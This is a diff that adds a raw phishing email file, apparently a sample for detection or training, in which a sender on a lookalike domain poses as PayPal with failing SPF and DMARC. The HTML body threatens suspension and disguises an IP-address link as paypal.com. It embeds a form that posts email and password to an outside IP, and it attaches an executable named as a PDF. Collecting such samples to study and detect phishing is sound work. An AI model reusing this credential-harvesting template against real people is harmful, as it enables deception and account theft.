@@ -1,0 +1,36 @@
+Return-Path: <bounce@mailer-xz91.top>
+Received: from mailer-xz91.top (unknown [185.220.101.4])
+	by mx.example.com with ESMTP id 4F2A1
+Authentication-Results: mx.example.com;
+	spf=fail smtp.mailfrom=mailer-xz91.top;
+	dkim=none;
+	dmarc=fail header.from=paypal.com
+From: "PayPal Security service@paypal.com" <security@paypa1-support.xyz>
+Reply-To: help@secure-verify-account.top
+To: victim@example.com
+Subject: URGENT: Your account has been suspended
+Date: Mon, 16 Nov 2026 08:12:44 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUNDARY1"
+
+--BOUNDARY1
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<p>Dear customer,</p>
+<p>We noticed unusual activity on your account. Your account has been suspended.
+Please verify your account within 24 hours or it will be closed.</p>
+<p><a href="http://185.220.101.4/paypal/login.php">https://www.paypal.com/signin</a></p>
+<p>Or use this link: <a href="https://bit.ly/3xYzAbC">click here</a></p>
+<form action="http://185.220.101.4/collect.php" method="post">
+<input name="email"><input name="password" type="password"></form>
+</body></html>
+
+--BOUNDARY1
+Content-Type: application/octet-stream; name="Invoice_2026.pdf.exe"
+Content-Disposition: attachment; filename="Invoice_2026.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA=
+
+--BOUNDARY1--
